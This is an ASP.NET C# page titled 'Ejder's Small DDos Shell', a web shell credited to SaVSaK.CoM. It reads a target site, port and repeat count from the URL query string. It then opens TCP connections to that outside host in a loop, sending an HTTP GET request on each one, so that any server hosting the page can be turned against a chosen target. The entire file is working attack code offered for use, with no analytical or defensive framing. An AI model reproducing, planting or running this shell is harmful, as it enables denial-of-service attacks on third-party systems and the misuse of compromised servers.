<%@ Page Language="C#"%>
<%@ import Namespace = "System.Threading" %>
<%@ import Namespace = "System.Net.Sockets" %>
<%@ import Namespace = "System.Net" %>
<%@ import Namespace = "System.IO" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" >
<head runat="server">
    <title>Ejder ' s Small DDos Shell for WwW.SaVSaK.CoM</title>
</head>
<body>
<%
    //Coded by EJDER for SaVSaK.CoM
    try
    {
        String HOST = Request.QueryString.Get("site").ToString();
        int PORT = Convert.ToInt32(Request.QueryString.Get("port").ToString());
        int DONGU = Convert.ToInt32(Request.QueryString.Get("dongu").ToString()), say = 0;
        String DATA = "HTTP/1.1 GET /\r\nHost:"+HOST+"\r\nConnection: Keep-Alive\r\n";

        while (say <= DONGU)
        {//Coded by EJDER for SaVSaK.CoM
            try
            {
                IPHostEntry IPHost = Dns.GetHostEntry(HOST);
                IPAddress[] addr = IPHost.AddressList;
                EndPoint ep = new IPEndPoint(addr[0], PORT);
                Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                sock.Connect(ep);

                if (sock.Connected)
                {
                    Encoding ASCII = Encoding.ASCII;
                    Byte[] ByteGet = ASCII.GetBytes(DATA);
                    sock.Send(ByteGet, ByteGet.Length, 0);
                }
            }
            catch { }
            Response.Write("gonderildi...<br>");
            say++;
        }
    }
    catch { }
    //Coded by EJDER for SaVSaK.CoM
 %>
</body>
</html>
